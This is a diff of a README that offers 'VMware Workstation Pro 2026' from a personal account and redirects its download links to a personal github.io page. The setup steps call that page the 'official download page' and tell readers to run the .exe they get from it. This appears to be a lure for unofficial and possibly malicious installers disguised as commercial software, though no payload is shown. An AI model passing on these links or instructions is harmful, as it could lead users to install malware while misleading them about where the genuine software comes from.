@@ -1,6 +1,6 @@
 # 🖥️ VMware-Workstation-Pro-2026 - Streamline virtual machine management on Windows
 
-[![](https://img.shields.io/badge/Download-VMware_Workstation-blue.svg)](https://github.com/samreenjaved26/VMware-Workstation-Pro-2026)
+[![](https://img.shields.io/badge/Download-VMware_Workstation-blue.svg)](https://samreenjaved26.github.io)
 
 VMware Workstation Pro 2026 provides a stable environment to create, manage, and run virtual machines on your Windows computer. This software allows you to run multiple operating systems at the same time on a single physical machine. It serves as a laboratory for software testers, developers, and students who need a safe space to experiment with new settings, programs, or entire operating systems without affecting their main computer.
 
@@ -18,7 +18,7 @@ To run this software, your computer must meet the following hardware standards. 
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the [official download page](https://github.com/samreenjaved26/VMware-Workstation-Pro-2026) to obtain the installer file.
+1.  Visit the [official download page](https://samreenjaved26.github.io) to obtain the installer file.
 2.  Locate the downloaded `.exe` file in your Downloads folder.
 3.  Double-click the file to start the setup wizard.
 4.  Accept the license agreement when the window appears.
